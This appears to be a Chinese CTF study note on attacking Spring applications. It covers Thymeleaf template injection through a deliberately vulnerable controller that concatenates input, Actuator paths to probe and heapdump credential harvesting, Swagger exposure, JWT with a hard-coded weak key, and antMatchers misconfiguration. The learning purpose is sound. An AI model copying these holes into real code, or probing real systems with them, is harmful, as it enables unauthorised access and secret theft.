https://mp.weixin.qq.com/s?src=11&timestamp=1794304006&ver=7080&signature=NdSMX2*LfMs0gjxZnkqJdbuxpVioPJZ-g5Qw7ykKtTqY8tLVj-wQtYaHM*E*Kcb2IxA55JgveLiJvNYUmgty2NhdT7cNBXUYFVHZN5Bp9if3hw2ImosccAyodXaUBtJ3&new=1
```

在26年比赛中还能见到只能说确实很经典了而且它的利用难度低影响也大。

## Spring

这个东西写起来真没有servlet牢

```java
package com.example.demo9springboot;

import org.springframework.web.bind.annotation.*;
import org.springframework.web.context.annotation.RequestScope;



@RestController//这个注解相当于`@RestController` = `@Controller` + `@ResponseBody`前者相当于告诉服务器要把这个类里面写的mapping当成路由去注册，后面那个是把字符串的返回输出
public class DemoIndex {



    //访问/index目录返回index
    @RequestMapping("/index")
    public String index() {
        return "index";
    }

    //使用get方法访问
    //使用@GetMapping注解也是一样的
    @RequestMapping(value = "/get",method = RequestMethod.GET)
    public String get(){
        return "get";
    }

    //使用POST方法访问
    //使用@PostMapping
    @RequestMapping(value = "/post",method = RequestMethod.POST)
    public String post(){
        return "post";
    }

    //接收参数
    @RequestMapping(value = "/post_parameter",method = RequestMethod.POST)
    public String postparameter(@RequestParam String name){

        return name;
    }
    
    //接收任意参数无论是post还是get的参数都接受
    @RequestMapping("/parameter")
    public String parameter(@RequestParam String name){

        return name;
    }

}

```

![image-20261110200107476](image-20261110200107476.png)

可以看到不指定方法还是一样的两个参数都会接收的，中间用，隔开了。然后spring的代码提供了四种模板引擎

![image-20261110200720610](image-20261110200720610.png)

这里先说**Thymeleaf**，这个应该是听说的比较多的，然后就是导致SSTI的原因大多数都是直接拼接不处理输入比如说这样的写法。

```java
@PostMapping("/index")
    public String index(@RequestParam String data, String age, Model model,String cmd) {

        //固定写法，接收参数由model传给模板那边
        model.addAttribute("data", data);
        model.addAttribute("age", age);
        return "index" + cmd;
    }
```

直接拼接不处理输入就会导致模板注入。当然和Thymeleaf的版本也有关系，像使用阿里云的2.6.13就是不行的。使用漏洞版本才有问题。

![image-20261110210609310](image-20261110210609310.png)

注意要URL编码(poc)

**Freemarker**和它不一样，freemarker渲染的是ftl文件而不是index。但是它的payload的触发条件是直接写在ftl文件中才能触发使用可控参数的方式是不行的，所以可能出现的点也就在一些管理后台的可控的模板编辑或者上传，或者文件上传场景。

然后有个叫Velocity的模板引擎这个由于现在用的相对少我就不说明了大家看看文章就行

```tex
https://mp.weixin.qq.com/s?src=11&timestamp=1794359442&ver=7081&signature=zB5ph83BwAh8a0ckVGAOk5uy2G8M1o2Ub0WMbbibGd28EFYkdBeyh-JTwnOwoL6O34T-CP0trGWJjmWS8C9uapur4PRHs4Ag--pJwJYvzOJ3434P8WY2d7GjGTy6oqbj&new=1
```

其他模板相对来说就没这么常见有一次不知道啥比赛出了个groovy的好像是。忘了这里就不提及了

### Actuator

Spring Boot Actuator 提供了一系列 **端点（Endpoints）**，每个端点对应一种监控或管理功能，通过 HTTP 或 JMX 协议暴露应用的运行时信息 。主要功能包括：

- **健康检查（Health）**：检测应用及其依赖组件的状态，如数据库连接、磁盘空间、Redis 等是否正常。
- **指标收集（Metrics）**：提供 JVM、系统负载、HTTP 请求统计、线程池状态等性能指标，并可与 Prometheus、Datadog 等监控系统集成 
- **环境信息（Env）**：显示应用的配置属性、系统环境变量和配置文件信息
- **日志管理（Loggers）**：动态调整应用日志级别，方便调试和故障排查 
- **审计信息（Auditing）**：记录用户操作和系统事件，便于追踪和分析 
- **应用管理**：可安全地关闭应用或执行其他管理操作

说白了就是一个管理功能的插件服务类似于"资产页"那种感觉一般看这个就是未授权或者RCE的漏洞常规的我们找到了过后看他的常驻端口，比如内网的时候探测到8080是spring服务可以顺手探测一下8081是不是起的actuator。如果是的话可以看看这些常见的目录

```tex
/actuator/env
/actuator/heapdump
/actuator/httptrace
/actuator/info
/actuator/mappings
```

导致未授权的主要原因是配置不当比如配置文件

```
# 应用服务 WEB 访问端口
server.port=8089

# Actuator Web 访问端口
management.server.port=8081
management.endpoints.jmx.exposure.include=*
management.endpoints.web.exposure.include=*
management.endpoint.health.show-details=always


```

他就是初始化的文件没有做任何限制那么什么都会漏完。主要比较重要的是heapdump，把当前 JVM 内存全部导出成 hprof 文件，内存里明文的：数据库密码、jwt、token、ak/sk、接口密钥这些。 `/actuator/env` 很多时候密码会打星号，但是用heapdump 可以拿到原始明文。一般这种还是赌配置不当。

### Swagger

Swagger 是一个用于生成、描述、调用和可视化 RESTful API 的开源框架，但若访问控制配置不当，极易出现未授权访问与敏感信息泄露问题。攻击者可直接通过 Swagger-UI 页面获取 API 文档、接口参数，并构造请求进行利用。说直白一点就是一个API接口的可视化生成调试器，也是未授权访问的一个高触发点，容易泄露API接口

### JWT

这个应该比较熟悉了"**JWT = JSON Web Token**
一种**开放标准（RFC 7519）**，用于在网络应用中**以 JSON 对象的形式安全传递信息**。"JWT是身份令牌自带有身份信息不用再让服务端存储session，直接验签就能验证身份。辨识度很高

```tex
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6ImFkbWluMTIzIiwidXNlcm5hbWUiOiJhZG1pbiJ9.fMr5_GjLtfXiyVJu3z09AxUCIG1AQ5Df7Ls8YyF3Cso
```

看一个java实现的简单demo

```java
@RequestMapping("/login")
    public static String main(@RequestParam String username, @RequestParam String password) {
        //生成jwt

        String jwt = JWT.create()
                //header不写有默认头部
                //.withHeader()
                //payload
                .withClaim("username",username)
                .withClaim("password",password)
                //sign
                .sign(Algorithm.HMAC256("secret"));
        System.out.println(jwt);
        
        return jwt;

    }
```

还是很清晰整个JWT分为header payload和sign三部分，那么想要仿签名就需要正确的签名(sign)才行常见打法是弱签名爆破。使用jwt鉴权是一个比较常见的操作。然后就是关注header的alg字段一般是看得到的那里就是使用的算法比如这里使用的是HMAC。

### springsecurity

SpringSecurity 是在java开发中，很常用的一个库，用于身份验证、授权和安全性等功能上。antMatchers 配置不当导致的未授权

```java
antMatchers("/admin/**").access("hasRole('ADMIN')")
```

意思是当访问比如`/admin/me`这个目录需要鉴权是ADMIN.

```java
antMatchers("/js/**").permitAll()
```

这样就是放行的意思就是不需要鉴权

```java
antMatchers("/**/*.js").permitAll()
```

类比这个就是放行所有的js文件。

那么我们回到第一种写法，如果我们这样子写

```java
antMatchers("/admin/").access("hasRole('ADMIN')")
```

这其实是配置错误，也就是说这种情况我们访问/admin目录需要鉴权但是访问/admin/12312则不需要，就是说并没有递归的对下面的下级目录进行鉴权。还有就是 **regexMatchers 配置不当**这个就是改成了正则匹配式，还有**useSuffixPatternMatch 低版本**spring-webmvc版本在<=4.3.25的情况下`suffixPatternMatch`默认为`True`。该方法为是否启用后辍匹配,如果启用,则映射到`/users`的方法也可以匹配到`/users.*`，`/users` 和`/users.*`是相等的。

